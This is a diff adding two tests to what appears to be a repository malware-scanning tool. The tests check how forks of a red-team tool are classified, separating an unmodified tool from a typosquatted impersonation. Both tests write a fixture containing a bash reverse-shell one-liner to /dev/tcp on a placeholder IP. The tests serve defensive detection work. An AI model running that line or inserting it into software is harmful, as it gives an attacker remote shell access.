@@ -273,3 +273,83 @@ def test_hunt_confirms_weaponized_red_team_fork(tmp_path):
          do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
     assert db.findings_by_status("confirmed")  # weaponization in diverged file
     db.close()
+
+
+def test_hunt_redteam_tool_via_nonlineage_pivot_is_breadcrumb(tmp_path, monkeypatch):
+    # The breadcrumb bug: a red-team TOOL (named like a pinned tool) surfaced by a
+    # NON-lineage pivot (here: signature search) must NOT be pinned malicious on
+    # its own offensive code. With no upstream to diff, a reverse shell is the
+    # tool's purpose, not weaponization -> screened breadcrumb, never confirmed.
+    import git_warden.config as cfg
+    from git_warden.enums import DetectionMethod
+
+    sig_file = tmp_path / "sigs.json"
+    sig_file.write_text('[{"name":"x","query":"SLIVERSIG"}]', encoding="utf-8")
+    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)
+
+    class SigClient(FakeClient):
+        def search_code(self, query, per_page=20):
+            if "SLIVERSIG" in query:
+                return [{"repository": {
+                    "full_name": "mallory/sliver", "owner": {"login": "mallory"},
+                    "html_url": "https://github.com/mallory/sliver"},
+                    "path": "implant.sh"}]
+            return []
+
+    def clone_tool(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        # The red-team tool's OWN offensive code (a reverse shell). Tier-A alone,
+        # so WITHOUT the breadcrumb gate this would be confirmed malicious.
+        (dest / "implant.sh").write_text(
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "rt.sqlite")
+    summary = hunt(
+        db, SigClient(), TOOLS, run_id="rt", now=utcnow(),
+        do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
+        do_signature=True, do_tier2=True, clone=clone_tool)
+    row = db.conn.execute(
+        "SELECT status, detection_method, reasoning FROM repo_findings WHERE full_name = ?",
+        ("mallory/sliver",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == DetectionMethod.SIGNATURE_MATCH.value
+    assert row["status"] != "confirmed"           # breadcrumb, NOT pinned
+    assert "red-team tool" in (row["reasoning"] or "")
+    assert not db.findings_by_status("confirmed")  # nothing pinned to the registry
+    assert summary["counts"]["redteam_breadcrumbs"] == 1
+    db.close()
+
+
+def test_hunt_trojaned_impersonation_still_confirms(tmp_path, monkeypatch):
+    # Guard the precision boundary: a homoglyph/typosquat impersonation of a tool
+    # is NOT whitelisted as a breadcrumb (raw name differs), so a real implant in
+    # it still confirms.
+    import git_warden.config as cfg
+
+    sig_file = tmp_path / "sigs.json"
+    sig_file.write_text('[{"name":"x","query":"SLIVERSIG"}]', encoding="utf-8")
+    monkeypatch.setattr(cfg, "MALWARE_SIGNATURES_PATH", sig_file)
+
+    class SigClient(FakeClient):
+        def search_code(self, query, per_page=20):
+            if "SLIVERSIG" in query:
+                return [{"repository": {  # "sl1ver": typosquat, raw name != "sliver"
+                    "full_name": "mallory/sl1ver", "owner": {"login": "mallory"},
+                    "html_url": "https://github.com/mallory/sl1ver"},
+                    "path": "implant.sh"}]
+            return []
+
+    def clone_mal(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "implant.sh").write_text(
+            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "imp.sqlite")
+    hunt(db, SigClient(), TOOLS, run_id="imp", now=utcnow(),
+         do_ioc=False, do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
+         do_signature=True, do_tier2=True, clone=clone_mal)
+    assert any(r["full_name"] == "mallory/sl1ver"
+               for r in db.findings_by_status("confirmed"))
+    db.close()
